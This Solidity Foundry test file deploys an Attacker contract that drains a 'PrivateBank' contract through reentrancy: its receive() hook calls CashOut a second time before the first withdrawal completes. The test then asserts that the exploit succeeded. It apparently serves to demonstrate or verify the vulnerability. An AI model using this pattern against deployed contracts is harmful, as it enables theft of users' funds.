
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateBank, Log} from "../src/PrivateBank.sol";

contract TestReentrancyPrivateBank is Test {
    PrivateBank public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new PrivateBank(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The victim contract needs to have funds that can be drained

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PrivateBank public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = PrivateBank(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to establish a balance in the victim contract
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialSnapshot = address(this).balance;

        // 2. Store the value for the re-entrant call
        storedAttackVal = val;

        // 3. Call the vulnerable function
        _victim.CashOut(val);

        // 4. Verify Success Conditions
        // If we managed to call CashOut multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        if (attackCallCount < 2) {            
            // Re-enter the contract using the stored value
            _victim.CashOut(storedAttackVal);
        }
    }
}
